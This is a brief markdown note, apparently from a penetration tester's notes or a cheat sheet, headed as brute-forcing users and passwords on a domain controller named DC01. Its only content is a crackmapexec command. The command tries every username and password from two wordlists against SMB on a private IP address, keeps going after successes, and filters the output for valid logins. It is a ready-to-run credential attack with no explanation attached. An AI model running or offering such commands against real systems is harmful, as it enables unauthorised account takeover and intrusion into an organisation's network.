# Brute Force Users + PAssword on DC01

```shell
crackmapexec smb 192.168.100.50 -u users.txt -p pass.txt --continue-on-success | grep "[+]"
```